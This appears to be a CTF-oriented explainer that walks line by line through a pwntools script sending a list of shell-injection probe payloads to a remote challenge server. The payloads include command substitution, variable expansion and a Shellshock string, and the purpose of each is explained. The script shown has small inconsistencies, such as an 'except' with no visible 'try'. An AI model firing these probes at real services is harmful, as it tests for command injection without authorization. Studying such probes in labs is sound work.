# Input Sanitization Testing Script

## Context

This script is designed to test a secure sandbox environment that only allows specific symbols and numbers

This script is a **penetration testing utility** written in Python using the `pwntools` library. It's designed to test how a **remote server** handles various **inputs**, particularly with regard to **input sanitization** and potential **command injection vulnerabilities**.

---

### Code Breakdown (Line-by-Line)

---

#### **Imports**

```python
from pwn import remote, time
```

* `remote`: from the `pwntools` library — it’s used to connect to remote TCP services (like a netcat session).
* `time`: a module from pwntools that provides timing functions (like sleep). This overrides the standard `time` module with a more CTF-friendly version.

---

#### **Configuration**

```python
HOST="<IP>" # Change to the IP of the challenge
PORT = <PORT> # Change to the port of the challenge
```

* The IP address and port of the **challenge server** 

---

#### **Allowed Characters**

```python
allowed_chars ='0123456789${}/?" &:><=_()[]' # This can be changed to match a challenge directive
```

* These are the **characters allowed by the server's input validation**, likely derived from a regex on the server side. Any characters not in this set may be **filtered or rejected**.

---

#### **Payloads to Test**

```python
test_payloads = [
    "", # empty input         
    " ",
    "\t",
    "${HOME}",
    "$((1+1))",
    "$(echo 123)",
    "? : /",
    '"$HOME"',
    "12345",
    "a",  # this should be blocked
    "ls",  # likely blocked
    "echo test",
    "() { :; }; echo vulnerable",  # bash function test
    "$(());",
    ">&9",  # file descriptor manipulation
    "?name=value&another=value2",
    "$USER=$_",
    "$$",
]
```

Each payload is trying to explore how the server processes input. Here's a deeper look:

| Payload                        | Purpose                                                           |
| ------------------------------ | ----------------------------------------------------------------- |
| `""`, `" "`, `"\t"`            | Test how empty or whitespace is handled.                          |
| `"${HOME}"`, `"$HOME"`         | Test **variable expansion**.                                      |
| `"$((1+1))"`                   | Test **arithmetic expansion** in bash.                            |
| `"$(echo 123)"`                | Test **command substitution**.                                    |
| `"?"`, `"/"`, `":"`            | Test **URL-related or regex special chars**.                      |
| `"a"`                          | Should be **blocked** — not in allowed set.                       |
| `"ls"`, `"echo test"`          | Basic shell commands — checking if they run.                      |
| `"() { :; }; echo vulnerable"` | Classic **Shellshock** payload (Bash CVE-2014-6271).              |
| `"$(());"`                     | Likely invalid syntax — see how server reacts.                    |
| `"&>9"`                        | Test **file descriptor manipulation**, might crash or be ignored. |
| `"name=value&another=value2"`  | URL-style param test.                                             |
| `"$USER=$_"`                   | Environment variable play.                                        |
| `"$$"`                         | Should return the **PID** of the shell process.                   |

---

#### **Main Function**

```python
def main():
```

* The entry point of the script. It handles all interaction with the remote service.

---

#### **Connect to Remote Service**

```python
conn = remote(HOST, PORT)
```

* Establishes a TCP connection to the target server.

---

#### **Receive and Print Initial Banner**

```python
print("[+] Initial response:")
print(conn.recv(timeout=2).decode())
```

* Reads and prints the initial data from the server — often a **banner**, welcome message, or prompt.

---

#### **Send Each Payload**

```python
for i, payload in enumerate(test_payloads):
    print(f"\n[+] Sending payload {i+1}: {repr(payload)}")
    conn.sendline(payload.encode())
```

* Loops through all test payloads.
* Sends each as a **newline-terminated input** (using `.sendline()`).
* Payload is encoded into bytes.

---

#### **Wait and Receive Response**

```python
time.sleep(0.5) #small delay to allow server to process

if response := conn.recv(timeout=2).decode(): # type: ignore
    print("[*] Response:")
    print(response)
else:
    print("[!] No response received")
```

* Waits **0.5 seconds** to give the server time to respond.
* Tries to **receive up to 2 seconds** worth of response.
* If the server sends anything, it's decoded and printed.

`response := conn.recv(timeout=2).decode()` is **walrus operator** syntax (Python 3.8+), which assigns and evaluates in one step.

---

#### **Error Handling and Cleanup**

```python
except Exception as e:
    print("[-] Error:", e)
finally:
    conn.close()
```

* Catches any exception during the process and prints it.
* Always closes the connection at the end, even if an error occurs.

---

#### **Run if Called as Script**

```python
if __name__ == "__main__":
    main()
```

* Ensures the script only runs if it's **executed directly**, not if it's imported as a module.

---

## 🧠 Key Concepts and Learning Opportunities

### ✅ **Input Sanitization & Bypassing Filters**

* Useful when testing blacklists (e.g., `a` is not allowed, but `${a}` might be).
* Learn more: [OWASP Input Validation](https://owasp.org/www-community/Input_Validation)

### 🐚 **Shell Injection**

* Exploiting how shells parse variables, commands, or functions.
* Learn about Shellshock: [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

### 🧰 **pwntools**

* A powerful library for interacting with CTF-style binary challenges.
* Docs: [pwntools.readthedocs.io](https://docs.pwntools.com/en/stable/)

### 💻 **Command Substitution in Shells**

* `${var}`, `$(...)`, `$((...))` are common in shell scripting and can lead to unintended execution.
* Shell cheat sheet: [explainshell.com](https://explainshell.com)

---

## 🚀 Takeaways

* This script is a **probe** for testing command execution and input handling on a remote service.
* It's deliberately using **edge cases**, **shell syntax**, and **special chars** to test for:

  * Command injection
  * Bad sanitization
  * Shellshock-like behavior
* It's a **safe and effective methodology** used in CTFs and pentests.
